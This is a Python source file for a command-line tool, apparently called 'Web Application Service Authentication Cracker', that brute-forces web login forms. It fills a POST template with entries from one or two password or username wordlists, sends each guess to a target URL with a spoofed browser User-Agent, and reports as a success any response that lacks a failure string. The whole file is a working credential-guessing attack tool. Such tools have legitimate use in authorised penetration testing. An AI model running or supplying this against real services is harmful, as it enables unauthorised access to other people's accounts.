import argparse
import requests
import sys

def print_banner():
    print(' __      __                               ')
    print('/  \\    /  \\_____    ___________    ____  ')
    print('\\   \\/\\/   /\\__  \\  /  ___/\\__  \\ _/ ___\\ ')
    print(' \\        /  / __ \\_\\___ \\  / __ \\\\  \\___ ')
    print('  \\__/\\  /  (____  /____  >(____  /\\___  >')
    print('       \\/        \\/     \\/      \\/     \\/ ')
    print('Web Application Service Authentication Cracker v0.1.0')
    print('Copyright (c) Gr3yPh 2024')

def load_payloads(payload_file):
    try:
        with open(payload_file, 'r') as f:
            return [line.strip() for line in f]
    except IOError:
        print(f'[-] Error opening file: {payload_file}. Please check if the file is valid.')
        sys.exit(1)

def send_request(target, data, headers):
    try:
        return requests.post(target, headers=headers, data=data, timeout=10)
    except requests.RequestException:
        print('[-] Error connecting to the target. Check the Internet connections and try again.')
        sys.exit(1)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='A tool to crack web applications\' service authentication')
    parser.add_argument('-t', '--target', type=str, required=True, help='Target URL')
    parser.add_argument('--payload-count', type=int, choices=[1, 2], required=True, help='Payload count (1 or 2)')
    parser.add_argument('-p1', '--payload1', type=str, help='The path of the first payload\'s dictionary')
    parser.add_argument('-p2', '--payload2', type=str, help='The path of the second payload\'s dictionary')
    parser.add_argument('-f', '--format', type=str, required=True, help='POST Format (replace payload position with ^P1^ and ^P2^)')
    parser.add_argument('-F', '--First', action='store_true', help='Stop cracking as soon as the first valid payload is found')
    parser.add_argument('--grep-match', type=str, help='Flag items that contain this value', default='failed')
    args = parser.parse_args()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362'
    }

    count = success_count = fail_count = 0

    if args.payload_count == 1:
        payloads = load_payloads(args.payload1)
        for payload1 in payloads:
            count += 1
            data = args.format.replace('^P1^', payload1)
            response = send_request(args.target, data, headers)
            if args.grep_match.encode() in response.content:
                print(f'Payload: {payload1} Response length: {len(response.text)} Failed')
                fail_count += 1
            else:
                print(f'Payload: {payload1} Response length: {len(response.text)} Success')
                success_count += 1
                if args.First:
                    break

    elif args.payload_count == 2:
        payloads1 = load_payloads(args.payload1)
        payloads2 = load_payloads(args.payload2)
        for payload1 in payloads1:
            for payload2 in payloads2:
                count += 1
                data = args.format.replace('^P1^', payload1).replace('^P2^', payload2)
                response = send_request(args.target, data, headers)
                if args.grep_match.encode() in response.content:
                    print(f'Payload: {payload1} and {payload2} Response length: {len(response.text)} Failed')
                    fail_count += 1
                else:
                    print(f'Payload: {payload1} and {payload2} Response length: {len(response.text)} Success')
                    success_count += 1
                    if args.First:
                        break

    print('\n', '*' * 25, '\n')
    print('[+] Finished.')
    print(f'[*] Total {count}')
    print(f'[*] Success count {success_count}')
    print(f'[*] Failure count {fail_count}')

if __name__ == "__main__":
    main()
